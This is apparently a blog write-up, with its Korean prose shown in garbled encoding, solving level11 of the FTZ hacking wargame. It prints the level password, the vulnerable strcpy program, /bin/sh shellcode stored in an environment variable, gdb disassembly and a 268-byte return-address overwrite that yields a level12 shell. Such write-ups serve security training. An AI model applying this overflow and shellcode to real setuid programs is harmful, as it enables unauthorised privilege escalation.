---
title: "[FTZ] level11 í’€ì´"
categories:
  - ftz
tags:
  - FTZ
toc: true
toc_sticky: true
toc_label: "level11 í’€ì´"
toc_icon: "bookmark"
author_profile: true
header:
  teaser: /assets/images/ftz.png
---

ğŸ’¡ FTZ level11 í’€ì´
{: .notice--warning}


# ë¬¸ì œ

ê³„ì • : level11/what!@#$?

**hint**
```
#include <stdio.h>
#include <stdlib.h>

int main( int argc, char *argv[] )
{
        char str[256];

        setreuid( 3092, 3092 );
        strcpy( str, argv[1] );
        printf( str );
}

```

# í’€ì´

bof ì·¨ì•½ì ì´ ì¡´ì¬í•œë‹¤. ì‰˜ ì½”ë“œë¥¼ ì‘ì„±í•˜ì—¬ ì‰˜ ì½”ë“œ ì£¼ì†Œë¡œ ret ì£¼ì†Œë¥¼ ë®ì–´ ì¨ì„œ ê¶Œí•œì„ íƒˆì·¨í•œë‹¤.

ì‰˜ ì½”ë“œëŠ” ì‘ì„±í•˜ëŠ”ê±´ ìƒëµí•˜ê³ , ì‰˜ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤.

```
\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80
```

## í™˜ê²½ë³€ìˆ˜
ì‰˜ ì½”ë“œë¥¼ í™˜ê²½ë³€ìˆ˜ì— ë“±ë¡í•˜ì—¬ ë¦¬í„´ ì£¼ì†Œë¥¼ í™˜ê²½ë³€ìˆ˜ë¡œ ë°”ê¾¸ëŠ” ë°©ë²•ì…ë‹ˆë‹¤. í™˜ê²½ ë³€ìˆ˜ì— ë“±ë¡ë˜ë©´, ë©”ëª¨ë¦¬ ìœ„ì¹˜ê°€ ë°”ë€Œì§€ ì•ŠëŠ”ë‹¤ëŠ” ì¥ì ì´ ìˆìŠµë‹ˆë‹¤.

1) í™˜ê²½ë³€ìˆ˜ì— shell ì½”ë“œ ë“±ë¡í•˜ê¸°

```sh
[level11@ftz level11]$ export sh=$(python -c 'print("\x90"*10 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80")')
```

![image](https://user-images.githubusercontent.com/33647663/167302401-ee84a3d6-1b23-49a2-9645-c852c875921d.png)

2) í™˜ê²½ë³€ìˆ˜ì˜ ë©”ëª¨ë¦¬ ì£¼ì†Œ ì•Œì•„ë‚´ê¸°

í™˜ê²½ë³€ìˆ˜ì˜ ë©”ëª¨ë¦¬ ì£¼ì†ŒëŠ” ë‹¤ìŒê³¼ ê°™ì´ ì½”ë“œë¥¼ ì‘ì„±í•˜ì—¬ ì•Œì•„ëƒ…ë‹ˆë‹¤.

**env.c**

```c
#include <stdio.h>

int main(int argc, char* argv[]){
    char *addr;
    addr = (char*)getenv(argv[1]);
    printf("located at %p\n",addr);
    return 0;
}
```

```sh
[level11@ftz tmp]$ gcc -o env env.c
[level11@ftz tmp]$ ./env sh
located at 0xbfffff2f
```

3) bof ì·¨ì•½ì ì„ ì´ìš©í•˜ì—¬ ret ì£¼ì†Œ ë³€ê²½
   
```sh
[level11@ftz level11]$ gdb -q attackme
(gdb) set disassembly-flavor intel
(gdb) disass main
Dump of assembler code for function main:
0x08048470 <main+0>:    push   ebp
0x08048471 <main+1>:    mov    ebp,esp
0x08048473 <main+3>:    sub    esp,0x108
0x08048479 <main+9>:    sub    esp,0x8
0x0804847c <main+12>:   push   0xc14
0x08048481 <main+17>:   push   0xc14
0x08048486 <main+22>:   call   0x804834c <setreuid>
0x0804848b <main+27>:   add    esp,0x10
0x0804848e <main+30>:   sub    esp,0x8
0x08048491 <main+33>:   mov    eax,DWORD PTR [ebp+12]
0x08048494 <main+36>:   add    eax,0x4
0x08048497 <main+39>:   push   DWORD PTR [eax]
0x08048499 <main+41>:   lea    eax,[ebp-264]
0x0804849f <main+47>:   push   eax
0x080484a0 <main+48>:   call   0x804835c <strcpy>
0x080484a5 <main+53>:   add    esp,0x10
0x080484a8 <main+56>:   sub    esp,0xc
0x080484ab <main+59>:   lea    eax,[ebp-264]
0x080484b1 <main+65>:   push   eax
0x080484b2 <main+66>:   call   0x804833c <printf>
0x080484b7 <main+71>:   add    esp,0x10
0x080484ba <main+74>:   leave
0x080484bb <main+75>:   ret
0x080484bc <main+76>:   nop
0x080484bd <main+77>:   nop
0x080484be <main+78>:   nop
0x080484bf <main+79>:   nop
End of assembler dump.
(gdb)
```

ìŠ¤íƒì˜ êµ¬ì¡°ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

```md
str 256 byte
dummy 8 byte
ebp 4 byte
ret 4 byte
```

ë”°ë¼ì„œ 268 ë°”ì´íŠ¸ì˜ ë”ë¯¸ë¥¼ ë„£ì–´ì£¼ê³ , í™˜ê²½ë³€ìˆ˜ì˜ ì£¼ì†Œë¥¼ ë„£ì–´ì£¼ë©´ ë©ë‹ˆë‹¤.

```sh
[level11@ftz level11]$ ./attackme $(python -c 'print("A"*268+"\x2f\xff\xff\xbf")')
sh-2.05b$ id
uid=3092(level12) gid=3091(level11) groups=3091(level11)
sh-2.05b$
```

